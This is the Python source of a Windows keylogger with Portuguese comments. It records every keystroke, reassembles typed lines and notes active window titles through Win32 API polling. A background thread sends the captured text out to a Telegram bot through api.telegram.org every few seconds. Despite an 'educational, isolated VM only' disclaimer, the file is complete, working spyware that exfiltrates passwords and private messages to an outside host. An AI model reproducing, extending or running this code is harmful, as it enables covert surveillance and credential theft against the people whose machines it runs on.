# key_simple_v1.10.py - Polling agressivo + envio em thread separada a cada 3s
# VM isolada SOMENTE - fins educacionais

import ctypes
import datetime
import time
import requests
import random
import threading
import queue

# CONFIG
TELEGRAM_TOKEN  = "841"
TELEGRAM_CHAT_ID = "845"

user32   = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

GetForegroundWindow = user32.GetForegroundWindow
GetWindowTextW      = user32.GetWindowTextW
GetAsyncKeyState    = user32.GetAsyncKeyState
MapVirtualKeyW      = user32.MapVirtualKeyW
GetKeyState         = user32.GetKeyState

event_queue = queue.Queue()  # fila para envio assíncrono

def get_window_title():
    try:
        hwnd = GetForegroundWindow()
        buf = ctypes.create_unicode_buffer(256)
        GetWindowTextW(hwnd, buf, 256)
        title = buf.value.strip()
        return title[:80] if title else "Sem título"
    except:
        return "ERRO_TITULO"

def log(msg, error=False):
    file = "keylog_erro.txt" if error else "keylog_log.txt"
    ts = datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S.%f')[:-3]
    with open(file, "a", encoding="utf-8") as f:
        f.write(f"{ts}  {msg}\n")

def send_worker():
    while True:
        try:
            messages = []
            while not event_queue.empty():
                messages.append(event_queue.get_nowait())
            if messages:
                text = "\n".join(messages)
                try:
                    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
                    params = {"chat_id": TELEGRAM_CHAT_ID, "text": text[:3900]}
                    r = requests.get(url, params=params, timeout=7)
                    if r.status_code == 200:
                        log(f"Thread enviou {len(messages)} eventos")
                    else:
                        log(f"Thread erro {r.status_code}", error=True)
                except Exception as e:
                    log(f"Thread exceção: {str(e)}", error=True)
            time.sleep(0.1)  # evita CPU 100% na thread de envio
        except:
            time.sleep(1)

def send_event(msg):
    event_queue.put(msg)

def get_key(vk):
    specials = {8:"[BACK]",9:"[TAB]",13:"[ENTER]",27:"[ESC]",32:"[SPACE]",
                37:"[←]",38:"[↑]",39:"[→]",40:"[↓]",46:"[DEL]",186:"[Ç]",192:"[´/~]",226:"[< >]"}
    if vk in specials:
        return specials[vk]

    shift = bool(GetAsyncKeyState(16) & 0x8000)
    altgr = bool(GetAsyncKeyState(18) & 0x8000) and bool(GetAsyncKeyState(17) & 0x8000)
    caps  = bool(GetKeyState(0x14) & 1)

    try:
        mapped = MapVirtualKeyW(vk, 2)
        if mapped:
            c = chr(mapped)
            if altgr:
                altgr_map = {'a':'á','e':'é','i':'í','o':'ó','u':'ú','c':'ç'}
                c = altgr_map.get(c.lower(), c)
            elif shift:
                shift_map = str.maketrans("1234567890-=[]\\;',./`\"", "!@#$%^&*()_+{}|:\"<>?~")
                c = c.translate(shift_map) or c.upper()
            elif caps:
                c = c.upper() if c.islower() else c.lower()
            return c
    except:
        pass
    return f"[VK{vk:02X}]"

# ===================== INÍCIO =====================
if __name__ == "__main__":
    print("v1.10 iniciado - polling agressivo + envio assíncrono a cada ~3s")
    log("Iniciado v1.10")

    # Thread de envio em background
    threading.Thread(target=send_worker, daemon=True).start()

    send_event(f"v1.10 INICIADO • {datetime.datetime.now():%d/%m/%Y %H:%M:%S}")

    current_window = ""
    line_buffer = ""
    last_send_time = time.time()
    key_counter = 0

    was_pressed = [False] * 256

    while True:
        try:
            new_window = get_window_title()
            if new_window != current_window:
                if line_buffer.strip():
                    send_event(f"[{current_window}] LINHA → {line_buffer.strip()}")
                send_event(f"→ {new_window}")
                current_window = new_window
                line_buffer = ""

            for vk in range(8, 255):
                now_pressed = bool(GetAsyncKeyState(vk) & 0x8000)
                if now_pressed and not was_pressed[vk]:
                    key = get_key(vk)
                    key_counter += 1

                    ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
                    send_event(f"{ts} | {current_window} | {key}")

                    if key == "[ENTER]":
                        if line_buffer.strip():
                            send_event(f"[{current_window}] LINHA → {line_buffer.strip()}")
                        line_buffer = ""
                    elif key == "[BACK]":
                        if line_buffer:
                            line_buffer = line_buffer[:-1]
                    elif key == "[TAB]":
                        line_buffer += "    "
                    elif key == "[SPACE]":
                        line_buffer += " "
                    elif len(key) == 1:
                        line_buffer += key

                    if len(line_buffer) > 3000:
                        send_event(f"[{current_window}] buffer parcial → {line_buffer[:1500]}…")
                        line_buffer = line_buffer[-1500:]

                was_pressed[vk] = now_pressed

            # Força envio a cada ~3 segundos
            if time.time() - last_send_time > 3.0:
                send_event(f"DEBUG: {key_counter} teclas capturadas até agora")
                last_send_time = time.time()

            time.sleep(0.0018)  # ~555 checks/seg - muito agressivo

        except Exception as e:
            log(f"Erro loop: {str(e)}", error=True)
            time.sleep(5)